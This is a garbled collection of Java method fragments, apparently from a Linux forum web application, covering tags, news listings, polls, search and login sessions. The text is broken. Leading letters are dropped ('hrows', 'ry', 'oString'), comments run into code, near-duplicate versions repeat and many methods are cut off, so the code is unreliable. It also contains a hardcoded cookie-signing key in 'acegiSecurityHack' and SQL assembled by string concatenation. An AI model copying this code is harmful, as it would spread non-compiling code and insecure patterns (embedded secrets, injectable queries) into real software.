public static String getTagLinks ( Connection con , int msgid ) hrows SQLException { StringBuilder buf = new StringBuilder ( ) ; Tags ags = new Tags ( con , msgid ) ; ArrayList < String > mtags = ags . getTags ( ) ; if ( mtags . isEmpty ( ) ) { return " " ; } for ( String mtag : mtags ) { if ( buf . length ( ) > 0 ) { buf . append ( " , " ) ; } else { buf . append ( " [: " ) ; } ry { buf . append ( " <a href= \" view-news.jsp?section=1&amp;tag= " ) . append ( URLEncoder . encode ( mtag , " UTF-8 " ) ) . append ( " \" > " ) . append ( mtag ) . append ( " </a> " ) ; } catch ( UnsupportedEncodingException e ) { hrow new RuntimeException ( e ) ; } } if ( buf . length ( ) > 0 ) { buf . append ( " ] " ) ; } return buf . oString ( ) ; } 
public String oString ( ) { if ( ags = = null | | ags . isEmpty ( ) ) { return " " ; } String str = " " ; for ( String ag : ags ) { str + = ( str . length ( ) > 0 ? " , " : " " ) + ag ; } return str ; } 
public static void updateCounters ( Connection con , List < String > oldTags , List < String > newTags ) hrows SQLException { PreparedStatement stInc = con . prepareStatement ( " UPDATE tags_values SET counter=counter+1 WHERE id=? " ) ; PreparedStatement stDec = con . prepareStatement ( " UPDATE tags_values SET counter=counter-1 WHERE id=? " ) ; if ( oldTags = = null ) { oldTags = Collections . emptyList ( ) ; } for ( String ag : newTags ) { if ( ! oldTags . contains ( ag ) ) { int id = getOrCreateTag ( con , ag ) ; stInc . setInt ( 1 , id ) ; stInc . executeUpdate ( ) ; } } for ( String ag : oldTags ) { if ( ! newTags . contains ( ag ) ) { 
public static List < String > parseTags ( String ags ) hrows UserErrorException { Set < String > agSet = new HashSet < String > ( ) ; tags = tags.replaceAll("\\|",","); String [] tagsArr = tags.split(","); if (tagsArr.length==0) { return Collections.emptyList(); } for (int i = 0; i < tagsArr.length; i++) { String tag = StringUtils.stripToNull(tagsArr[i].toLowerCase()); - if (tag==null) { continue; } : , , , <> checkTag(tag); tagSet.add(tag); } return new ArrayList<String>(tagSet); } 
public static void updateTags ( Connection con , int msgid , List < String > agList ) hrows SQLException { List < String > oldTags = Tags . getMessageTags ( con , msgid ) ; PreparedStatement insertStatement = con . prepareStatement ( " INSERT INTO tags VALUES(?,?) " ) ; PreparedStatement deleteStatement = con . prepareStatement ( " DELETE FROM tags WHERE msgid=? and tagid=? " ) ; insertStatement . setInt ( 1 , msgid ) ; deleteStatement . setInt ( 1 , msgid ) ; for ( String ag : agList ) { if ( ! oldTags . contains ( ag ) ) { int id = getOrCreateTag ( con , ag ) ; insertStatement . setInt ( 2 , id ) ; insertStatement . executeUpdate ( ) ; } } for ( String ag : oldTags ) { if ( ! agList . contains ( ag ) ) { int id = getOrCreateTag ( con , ag ) ; deleteStatement . setInt ( 2 , id ) ; deleteStatement . executeUpdate ( ) ; } } insertStatement . close ( ) ; deleteStatement . close ( ) ; } 
public String show ( Connection db ) hrows IOException , SQLException , UtilException , UserErrorException { StringBuffer buf = new StringBuffer ( ) ; Statement st = db . createStatement ( ) ; StringBuilder where = new StringBuilder ( " sections.id=groups.section AND topics.id=msgbase.id AND topics.userid=users.id " + " AND topics.groupid=groups.id AND NOT deleted " ) ; if ( ! viewAll ) { where . append ( " AND (topics.moderate OR NOT sections.moderate) " ) ; } else { where . append ( " AND (NOT topics.moderate) AND sections.moderate " ) ; } if ( section ! = 0 ) { where . append ( " AND section= " ) . append ( section ) ; } if ( group ! = 0 ) { where . append ( " AND groupid= " ) . append ( group ) ; } if ( datelimit ! = null ) { where . append ( " AND " ) . append ( datelimit ) ; } if ( ag ! = null & & ! " " . equals ( ag ) ) { PreparedStatement pst = db . prepareStatement ( " SELECT id FROM tags_values WHERE value=? AND counter>0 " ) ; pst . setString ( 1 , ag ) ; ResultSet rs = pst . executeQuery ( ) ; if ( rs . next ( ) ) { int agid = rs . getInt ( " id " ) ; if ( agid > 0 ) { where . append ( " AND topics.id IN (SELECT msgid FROM tags WHERE tagid= " ) . append ( agid ) . append ( " ) " ) ; } } else { hrow new UserErrorException ( " Tag not found " ) ; } rs . close ( ) ; pst . close ( ) ; } ResultSet res = st . executeQuery ( " SELECT topics.title as subj, topics.lastmod, topics.stat1, postdate, nick, image, " + " groups.title as gtitle, topics.id as msgid, sections.comment, groups.id as guid, " + " opics.url, topics.linktext, imagepost, vote, sections.name as pname, linkup, " + " postdate<(CURRENT_TIMESTAMP-expire) as expired, message, sections.id as section, NOT topics.sticky AS ssticky " + " FROM topics,groups,users,sections,msgbase " + " WHERE " + where . oString ( ) + " " + " ORDER BY ssticky,commitdate DESC, msgid DESC " + limit ) ; while ( res . next ( ) ) { buf . append ( showCurrent ( db , res ) ) ; } res . close ( ) ; return buf . oString ( ) ; } 
public String getVariantID ( ProfileHashtable prof ) hrows UtilException { return " ag= " + prof . getInt ( " ags " ) ; } 
public synchronized boolean check ( String ip , boolean rusted ) { cleanup ( rusted ) ; if ( hash . containsKey ( ip ) ) { return false ; } hash . put ( ip , new Date ( ) ) ; return rue ; } 
public void checkDuplication ( String ip ) hrows DuplicationException { if ( ! check ( ip , false ) ) { hrow new DuplicationException ( ) ; 
public void checkDuplication ( String ip , boolean rusted ) hrows DuplicationException { if ( ! check ( ip , rusted ) ) { hrow new DuplicationException ( ) ; 
private synchronized void cleanup ( boolean rusted ) { Date current = new Date ( ) ; for ( Iterator < Map . Entry < String , Date > > i = hash . entrySet ( ) . iterator ( ) ; i . hasNext ( ) ; ) { Map . Entry < String , Date > entry = i . next ( ) ; 
public static Set < String > getTopTags ( Connection con ) hrows SQLException { Set < String > set = new TreeSet < String > ( ) ; PreparedStatement st = con . prepareStatement ( " SELECT counter,value FROM tags_values WHERE counter>5 ORDER BY counter DESC LIMIT " + TOP_TAGS_COUNT ) ; ResultSet rs = st . executeQuery ( ) ; while ( rs . next ( ) ) { set . add ( rs . getString ( " value " ) ) ; } return set ; } 
public static List < String > parseTags ( String ags ) hrows UserErrorException { Set < String > agSet = new HashSet < String > ( ) ; tags = tags.replaceAll("\\|",","); String [] tagsArr = tags.split(","); if (tagsArr.length==0) { return Collections.emptyList(); } for (String aTagsArr : tagsArr) { String tag = StringUtils.stripToNull(aTagsArr.toLowerCase()); - if (tag == null) { continue; } : , , , <> checkTag(tag); tagSet.add(tag); } return new ArrayList<String>(tagSet); } 
public static Set < String > getTopTags ( Connection con ) hrows SQLException { Set < String > set = new TreeSet < String > ( ) ; PreparedStatement st = con . prepareStatement ( " SELECT counter,value FROM tags_values WHERE counter>1 ORDER BY counter DESC LIMIT " + TOP_TAGS_COUNT ) ; ResultSet rs = st . executeQuery ( ) ; while ( rs . next ( ) ) { set . add ( rs . getString ( " value " ) ) ; } return set ; } 
public static String getTagLinks ( Connection con , int msgid ) hrows SQLException { StringBuilder buf = new StringBuilder ( ) ; Tags ags = new Tags ( con , msgid ) ; ArrayList < String > mtags = ags . getTags ( ) ; if ( mtags . isEmpty ( ) ) { return " " ; } for ( String mtag : mtags ) { if ( buf . length ( ) > 0 ) { buf . append ( " , " ) ; } ry { buf . append ( " <a href= \" view-news.jsp?section=1&amp;tag= " ) . append ( URLEncoder . encode ( mtag , " UTF-8 " ) ) . append ( " \" > " ) . append ( mtag ) . append ( " </a> " ) ; } catch ( UnsupportedEncodingException e ) { hrow new RuntimeException ( e ) ; } } return buf . oString ( ) ; } 
public static List < Group > getGroups ( Connection db , Storage storage , Section section ) hrows SQLException , StorageException , IOException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.moderate, sections.preformat, lineonly, imagepost, vote, section, havelink, linkup, linktext, sections.name as sname, title, image, restrict_topics, sections.browsable,stat1,stat2,stat3,groups.id FROM groups, sections WHERE sections.id= " + section . getId ( ) + " AND groups.section=sections.id ORDER BY id " ) ; List < Group > list = new ArrayList < Group > ( ) ; while ( rs . next ( ) ) { Group group = new Group ( rs ) ; group . updateInfo ( storage ) ; list . add ( group ) ; } return list ; } 
private void init ( ResultSet rs ) hrows SQLException { id = rs . getInt ( " id " ) ; moderate = rs . getBoolean ( " moderate " ) ; preformat = rs . getBoolean ( " preformat " ) ; lineonly = rs . getBoolean ( " lineonly " ) ; imagepost = rs . getBoolean ( " imagepost " ) ; votepoll = rs . getBoolean ( " vote " ) ; section = rs . getInt ( " section " ) ; havelink = rs . getBoolean ( " havelink " ) ; linkup = rs . getBoolean ( " linkup " ) ; linktext = rs . getString ( " linktext " ) ; sectionName = rs . getString ( " sname " ) ; itle = rs . getString ( " itle " ) ; image = rs . getString ( " image " ) ; restrictTopics = rs . getInt ( " restrict_topics " ) ; browsable = rs . getBoolean ( " browsable " ) ; stat1 = rs . getInt ( " stat1 " ) ; stat2 = rs . getInt ( " stat2 " ) ; stat3 = rs . getInt ( " stat3 " ) ; } 
private void updateInfo ( Storage storage ) hrows StorageException , IOException { info = storage . readMessageNull ( " grinfo " , String . valueOf ( id ) ) ; } 
public static List < Group > getGroups ( Connection db , Section section ) hrows SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.moderate, sections.preformat, lineonly, imagepost, vote, section, havelink, linkup, linktext, sections.name as sname, title, image, restrict_topics, sections.browsable,stat1,stat2,stat3,groups.id,groups.info FROM groups, sections WHERE sections.id= " + section . getId ( ) + " AND groups.section=sections.id ORDER BY id " ) ; List < Group > list = new ArrayList < Group > ( ) ; while ( rs . next ( ) ) { Group group = new Group ( rs ) ; list . add ( group ) ; } return list ; } 
private void init ( ResultSet rs ) hrows SQLException { id = rs . getInt ( " id " ) ; moderate = rs . getBoolean ( " moderate " ) ; preformat = rs . getBoolean ( " preformat " ) ; lineonly = rs . getBoolean ( " lineonly " ) ; imagepost = rs . getBoolean ( " imagepost " ) ; votepoll = rs . getBoolean ( " vote " ) ; section = rs . getInt ( " section " ) ; havelink = rs . getBoolean ( " havelink " ) ; linkup = rs . getBoolean ( " linkup " ) ; linktext = rs . getString ( " linktext " ) ; sectionName = rs . getString ( " sname " ) ; itle = rs . getString ( " itle " ) ; image = rs . getString ( " image " ) ; restrictTopics = rs . getInt ( " restrict_topics " ) ; browsable = rs . getBoolean ( " browsable " ) ; stat1 = rs . getInt ( " stat1 " ) ; stat2 = rs . getInt ( " stat2 " ) ; stat3 = rs . getInt ( " stat3 " ) ; info = rs . getString ( " info " ) ; } 
public static int createPoll ( Connection db , String itle , List < String > pollList ) hrows SQLException { int voteid = getNextPollId ( db ) ; PreparedStatement pst = db . prepareStatement ( " INSERT INTO votenames (id, title) values (?,?) " ) ; pst . setInt ( 1 , voteid ) ; pst . setString ( 2 , itle ) ; pst . executeUpdate ( ) ; ry { Poll poll = new Poll ( db , voteid ) ; for ( String variant : pollList ) { if ( variant . rim ( ) . length ( ) = = 0 ) { continue ; } poll . addNewVariant ( db , variant ) ; } Add new message } catch (PollNotFoundException ex) { throw new RuntimeException(ex); } return voteid; } 
public List < PollVariant > getPollVariants ( Connection db , int order ) hrows SQLException { List < PollVariant > variants = new ArrayList < PollVariant > ( ) ; Statement st = db . createStatement ( ) ; ResultSet rs ; switch ( order ) { case ORDER_ID : rs = st . executeQuery ( " SELECT * FROM votes WHERE vote= " + id + " ORDER BY id " ) ; break ; case ORDER_VOTES : rs = st . executeQuery ( " SELECT * FROM votes WHERE vote= " + id + " ORDER BY votes DESC, id " ) ; break ; default : hrow new RuntimeException ( " Oops!? order= " + order ) ; } while ( rs . next ( ) ) { int varId = rs . getInt ( " id " ) ; String label = rs . getString ( " label " ) ; int votes = rs . getInt ( " votes " ) ; variants . add ( new PollVariant ( varId , label , votes ) ) ; } return variants ; } 
private int getMaxVote ( Connection db ) hrows SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT max(votes) FROM votes WHERE vote= " + id ) ; rs . next ( ) ; int max = rs . getInt ( " max " ) ; if ( max = = 0 ) { max = 1 ; } rs . close ( ) ; st . close ( ) ; return max ; } 
public String renderPoll ( Connection db , Properties config , ProfileHashtable profile , int highlight ) hrows SQLException , BadImageException , IOException { StringBuffer out = new StringBuffer ( ) ; int max = getMaxVote ( db ) ; List vars = getPollVariants ( db , ORDER_VOTES ) ; out . append ( " <table> " ) ; ImageInfo info = new ImageInfo ( config . getProperty ( " HTMLPathPrefix " ) + profile . getString ( " style " ) + " /img/votes.gif " ) ; int otal = 0 ; for ( Iterator iter = vars . iterator ( ) ; iter . hasNext ( ) ; ) { PollVariant var = ( PollVariant ) iter . next ( ) ; out . append ( " <tr><td> " ) ; int id = var . getId ( ) ; int votes = var . getVotes ( ) ; if ( id = = highlight ) { out . append ( " <b> " ) ; } out . append ( HTMLFormatter . htmlSpecialChars ( var . getLabel ( ) ) ) ; if ( id = = highlight ) { out . append ( " </b> " ) ; } out . append ( " </td><td> " ) . append ( votes ) . append ( " </td><td> " ) ; otal + = votes ; for ( int i = 0 ; i < 20 * votes / max ; i + + ) { out . append ( " <img src= \" / " ) . append ( profile . getString ( " style " ) ) . append ( " /img/votes.gif \" alt= \" * \" " ) . append ( info . getCode ( ) ) . append ( '>' ) ; } out . append ( " </td></tr> " ) ; } out . append ( " <tr><td colspan=2> : " ) . append ( otal ) . append ( " </td></tr> " ) ; out . append ( " </table> " ) ; return out . oString ( ) ; } 
public String DocumentFooter ( boolean closeHtml ) hrows IOException , StorageException { StringBuffer out = new StringBuffer ( ) ; out . append ( " <p><i><a href= \" " ) . append ( getMainUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; if ( ! isMainPage ( ) ) { out . append ( " <div align=center><iframe src= \" dw.jsp?width=728&amp;height=90&amp;main=0 \" width= \" 728 \" height= \" 90 \" scrolling= \" no \" frameborder= \" 0 \" ></iframe></div> " ) ; } out . append ( " <p><div align=center> " ) ; if ( isMainPage ( ) ) { out . append ( config . getStorage ( ) . readMessage ( " buttons " , " op100-main-button " ) ) ; out . append ( config . getStorage ( ) . readMessage ( " buttons " , " oplist-main-button " ) ) ; } else { out . append ( config . getStorage ( ) . readMessage ( " buttons " , " oplist-button " ) ) ; } out . append ( " </div> " ) ; Google analytics out.append("<script src=\"http:www.google-analytics.com/urchin.js\" type=\"text/javascript\">" + "</script>" + "<script type=\"text/javascript\">" + "_uacct = \"UA-2184304-1\";" + "urchinTracker();" + "</script>"); if (closeHtml) { out.append("</body></html>"); } Date currentDate = new Date(); long millis = currentDate.getTime() - startDate.getTime(); if (millis>WARNING_EXEC_TIME) { logger.info("execTime="+millis/1000+" seconds (dbWait="+config.getDbWaitTime()/1000+" seconds): "+requestString); } return out.toString(); } 
public String show ( Connection db ) hrows IOException , SQLException , UtilException , UserErrorException { StringBuilder select = new StringBuilder ( " SELECT id, title, postdate, section, topic, userid, rank, headline(message, q, 'HighlightAll=True') as headline FROM ( " + " SELECT " + " msgs.id, title, postdate, section, topic, userid, rank(idxFTI, q) as rank,message " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; } if ( username . length ( ) > 0 ) { ry { User user = User . getUser ( db , username ) ; select . append ( " AND userid= " ) . append ( user . getId ( ) ) ; } catch ( UserNotFoundException ex ) { hrow new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100) as qq, plainto_tsquery('linux') as q " ) ; PreparedStatement pst = null ; ry { pst = db . prepareStatement ( select . oString ( ) ) ; 
public String show ( Connection db ) hrows IOException , SQLException , UtilException , UserErrorException { StringBuilder select = new StringBuilder ( " SELECT id, title, postdate, section, topic, userid, rank, headline(message, q, 'HighlightAll=True') as headline FROM ( " + " SELECT " + " msgs.id, title, postdate, section, topic, userid, rank(idxFTI, q) as rank,message " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; } if ( username . length ( ) > 0 ) { ry { User user = User . getUser ( db , username ) ; select . append ( " AND userid= " ) . append ( user . getId ( ) ) ; } catch ( UserNotFoundException ex ) { hrow new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100) as qq, plainto_tsquery(?) as q " ) ; PreparedStatement pst = null ; ry { pst = db . prepareStatement ( select . oString ( ) ) ; 
public String show ( Connection db ) hrows IOException , SQLException , UtilException , UserErrorException { StringBuilder select = new StringBuilder ( " SELECT id, title, postdate, section, topic, userid, rank, headline(message, q, 'HighlightAll=True') as headline FROM ( " + " SELECT " + " msgs.id, title, postdate, section, topic, userid, rank(idxFTI, q) as rank,message " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; } if ( username . length ( ) > 0 ) { ry { User user = User . getUser ( db , username ) ; select . append ( " AND userid= " ) . append ( user . getId ( ) ) ; } catch ( UserNotFoundException ex ) { hrow new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100) as qq, plainto_tsquery(?) as q " ) ; if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } PreparedStatement pst = null ; ry { pst = db . prepareStatement ( select . oString ( ) ) ; 
public String show ( Connection db ) hrows IOException , SQLException , UtilException , UserErrorException { StringBuilder select = new StringBuilder ( " SELECT qq.id, title, postdate, section, topic, userid, rank, headline(message, q, 'HighlightAll=True') as headline FROM ( " + " SELECT " + " msgs.id, title, postdate, section, topic, userid, rank(idxFTI, q) as rank " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; } if ( username . length ( ) > 0 ) { ry { User user = User . getUser ( db , username ) ; select . append ( " AND userid= " ) . append ( user . getId ( ) ) ; } catch ( UserNotFoundException ex ) { hrow new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100) as qq, plainto_tsquery(?) as q, msgbase WHERE msgbase.id=qq.id " ) ; if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } PreparedStatement pst = null ; ry { pst = db . prepareStatement ( select . oString ( ) ) ; 
public boolean getHover ( ) hrows UtilException { return getProf ( ) . getBoolean ( " hover " ) ; } 
public ModelAndView handleRequest ( HttpServletRequest request , HttpServletResponse response ) { return new ModelAndView ( " section " ) ; } 
public static Connection getConnection ( ) hrows SQLException { Connection db ; ry { InitialContext cxt = new InitialContext ( ) ; DataSource ds = ( DataSource ) cxt . lookup ( " java:/comp/env/jdbc/lor " ) ; if ( ds = = null ) { hrow new SQLException ( " Data source not found! (java:/comp/env/jdbc/lor) " ) ; } db = ds . getConnection ( ) ; } catch ( NamingException ex ) { hrow new RuntimeException ( ex ) ; } return db ; } 
public static String getViewer ( Viewer viewer , Template mpl , boolean nocache ) hrows UtilException , SQLException , IOException , UserErrorException { return new ViewerCacher ( ) . get ( viewer , mpl , nocache ) ; } 
public String get ( Viewer viewer , Template mpl , boolean nocache ) hrows UtilException , SQLException , IOException , UserErrorException { MemCachedClient mcc = MemCachedSettings . getClient ( ) ; String cacheId = MemCachedSettings . getId ( viewer . getVariantID ( mpl . getProf ( ) ) ) ; String res = null ; if ( ! nocache ) { ime = 0 ; long current = new Date ( ) . getTime ( ) ; res = ( String ) mcc . get ( cacheId ) ; ime = new Date ( ) . getTime ( ) - current ; fromCache = rue ; } if ( res = = null ) { Connection db = null ; ry { long current = new Date ( ) . getTime ( ) ; db = LorDataSource . getConnection ( ) ; res = viewer . show ( db ) ; ime = new Date ( ) . getTime ( ) - current ; fromCache = false ; } finally { if ( db ! = null ) { db . close ( ) ; } } mcc . add ( cacheId , res , viewer . getExpire ( ) ) ; } return res ; } 
public String getContentImpl ( ProfileHashtable profile ) hrows IOException , SQLException , BadDateException { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public String getContentImpl ( ProfileHashtable profile ) hrows IOException , SQLException { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public String getContentImpl ( ProfileHashtable profile ) hrows SQLException , UtilException { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public String getContentImpl ( ProfileHashtable profile ) hrows IOException , SQLException , UtilException { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
protected ModelAndView handleRequestInternal ( HttpServletRequest request , HttpServletResponse response ) hrows Exception { int sectionid = new ServletParameterParser ( request ) . getInt ( " section " ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public boolean isCorrectorSession ( ) { if ( ! isSessionAuthorized ( session ) ) { return false ; } return session . getValue ( " corrector " ) ! = null ? ( Boolean ) session . getValue ( " corrector " ) : false ; } 
public void acegiSecurityHack ( HttpServletResponse response , HttpSession session ) { String username = nick ; String cookieName = " ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE " ; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; long tokenValiditySeconds = 1209600; 14 days String key = "jam35Wiki"; from applicationContext-acegi-security.xml long expiryTime = System.currentTimeMillis() + (tokenValiditySeconds * 1000); construct token to put in cookie; format is: username + ":" + expiryTime + ":" + Md5Hex(username + ":" + expiryTime + ":" + password + ":" + key) String signatureValue = StringUtil.md5hash(username + ":" + expiryTime + ":" + password + ":" + key); String tokenValue = username + ":" + expiryTime + ":" + signatureValue; sun.misc.BASE64Encoder encoder = new sun.misc.BASE64Encoder(); String tokenValueBase64 = new String(encoder.encode(tokenValue.getBytes())); Add remember me cookie Cookie acegi = new Cookie(cookieName, tokenValueBase64); acegi.setMaxAge(new Long(expiryTime).intValue()); acegi.setPath("/wiki"); response.addCookie(acegi); Remove ACEGI_SECURITY_CONTEXT and session session.removeAttribute("ACEGI_SECURITY_CONTEXT"); if any Cookie sess = new Cookie("JSESSIONID", session.getId()); int maxAge = (int)(System.currentTimeMillis()/1000)+session.getMaxInactiveInterval(); sess.setMaxAge(maxAge); sess.setPath("/wiki"); response.addCookie(sess); } 
public boolean canCorrect ( ) { return corrector & & score > = CORRECTOR_SCORE ; } 
public boolean isBlockable ( ) { if ( id = = 2 ) { return false ; } if ( canModerate ( ) ) { return false ; } return maxScore < CORRECTOR_SCORE ; } 
public void acegiSecurityHack ( HttpServletResponse response , HttpSession session ) { String username = nick ; String cookieName = " ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE " ; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; long tokenValiditySeconds = 1209600; 14 days String key = "jam35Wiki"; from applicationContext-acegi-security.xml long expiryTime = System.currentTimeMillis() + (tokenValiditySeconds * 1000); construct token to put in cookie; format is: username + ":" + expiryTime + ":" + Md5Hex(username + ":" + expiryTime + ":" + password + ":" + key) String signatureValue = StringUtil.md5hash(username + ":" + expiryTime + ":" + password + ":" + key); String tokenValue = username + ":" + expiryTime + ":" + signatureValue; String tokenValueBase64 = new String(Base64.encodeBase64(tokenValue.getBytes())); Add remember me cookie Cookie acegi = new Cookie(cookieName, tokenValueBase64); acegi.setMaxAge(new Long(expiryTime).intValue()); acegi.setPath("/wiki"); response.addCookie(acegi); Remove ACEGI_SECURITY_CONTEXT and session session.removeAttribute("ACEGI_SECURITY_CONTEXT"); if any Cookie sess = new Cookie("JSESSIONID", session.getId()); int maxAge = (int)(System.currentTimeMillis()/1000)+session.getMaxInactiveInterval(); sess.setMaxAge(maxAge); sess.setPath("/wiki"); response.addCookie(sess); } 
public void acegiSecurityHack ( HttpServletResponse response , HttpSession session ) { } } 
public void acegiSecurityHack ( HttpServletResponse response , HttpSession session ) { String username = nick ; String cookieName = " ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE " ; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; long tokenValiditySeconds = 1209600; 14 days String key = "jam35Wiki"; from applicationContext-acegi-security.xml long expiryTime = System.currentTimeMillis() + (tokenValiditySeconds * 1000); construct token to put in cookie; format is: username + ":" + expiryTime + ":" + Md5Hex(username + ":" + expiryTime + ":" + password + ":" + key) String signatureValue = StringUtil.md5hash(username + ":" + expiryTime + ":" + password + ":" + key); String tokenValue = username + ":" + expiryTime + ":" + signatureValue; String tokenValueBase64 = new String(Base64.encodeBase64(tokenValue.getBytes())); Add remember me cookie Cookie acegi = new Cookie(cookieName, tokenValueBase64); acegi.setMaxAge(new Long(expiryTime).intValue()); acegi.setPath("/wiki"); response.addCookie(acegi); Remove ACEGI_SECURITY_CONTEXT and session session.removeAttribute("ACEGI_SECURITY_CONTEXT"); if any Cookie sess = new Cookie("JSESSIONID", session.getId()); int maxAge = (int)(System.currentTimeMillis()/1000)+session.getMaxInactiveInterval(); sess.setMaxAge(maxAge); sess.setPath("/wiki"); response.addCookie(sess); } 
public String getVariantID ( ProfileHashtable prof ) hrows UtilException { StringBuilder id = new StringBuilder ( " view-news? " + " opics= " + prof . getInt ( " opics " ) + " &messages= " + prof . getInt ( " messages " ) + " &style= " + prof . getString ( " style " ) + " &tag= " + URLEncoder . encode ( ag ) ) ; if ( viewAll ) { id . append ( " &view-all=true " ) ; } if ( section ! = 0 ) { id . append ( " &section= " ) . append ( section ) ; } if ( group ! = 0 ) { id . append ( " &group= " ) . append ( group ) ; } if ( datelimit ! = null ) { id . append ( " &datelimit= " ) . append ( URLEncoder . encode ( datelimit ) ) ; } if ( limit ! = null & & limit . length ( ) > 0 ) { id . append ( " &limit= " ) . append ( URLEncoder . encode ( limit ) ) ; } return id . oString ( ) ; } 
public String getVariantID ( ProfileHashtable prof ) hrows UtilException { StringBuilder id = new StringBuilder ( " view-news? " + " = " + prof . getInt ( " opics " ) + " &m= " + prof . getInt ( " messages " ) + " &st= " + prof . getString ( " style " ) + " &tg= " + URLEncoder . encode ( ag ) ) ; if ( viewAll ) { id . append ( " &v-all=true " ) ; } if ( section ! = 0 ) { id . append ( " &sec= " ) . append ( section ) ; } if ( group ! = 0 ) { id . append ( " &grp= " ) . append ( group ) ; } if ( datelimit ! = null ) { id . append ( " &dlmt= " ) . append ( URLEncoder . encode ( datelimit ) ) ; } if ( limit ! = null & & limit . length ( ) > 0 ) { id . append ( " &lmt= " ) . append ( URLEncoder . encode ( limit ) ) ; } return id . oString ( ) ; } 
public void init ( FilterConfig filterConfig ) hrows ServletException { his . filterConfig = filterConfig ; properties = getProperties ( filterConfig . getServletContext ( ) ) ; MemCachedSettings . setMainUrl ( properties . getProperty ( " MainUrl " ) ) ; } 
public void doFilter ( ServletRequest servletRequest , ServletResponse servletResponse , FilterChain filterChain ) hrows ServletException , IOException { if ( filterConfig = = null ) { return ; } ry { Template mpl = new Template ( ( HttpServletRequest ) servletRequest , properties , ( HttpServletResponse ) servletResponse ) ; servletRequest . setAttribute ( " emplate " , mpl ) ; } catch ( Exception ex ) { logger . severe ( " Can't build Template " + StringUtil . getStackTrace ( ex ) ) ; return ; } filterChain . doFilter ( servletRequest , servletResponse ) ; } 
public int saveNewMessage ( Connection db , String remoteAddr ) hrows SQLException { return saveNewMessage ( db , remoteAddr , " " ) ; } 
public int saveNewMessage ( Connection db , String remoteAddr , String userAgent ) hrows SQLException { PreparedStatement pst = null ; PreparedStatement pstMsgbase = null ; ry { allocation MSGID 
public boolean isSessionAuthorized ( ) { return isSessionAuthorized ( session ) ; } 
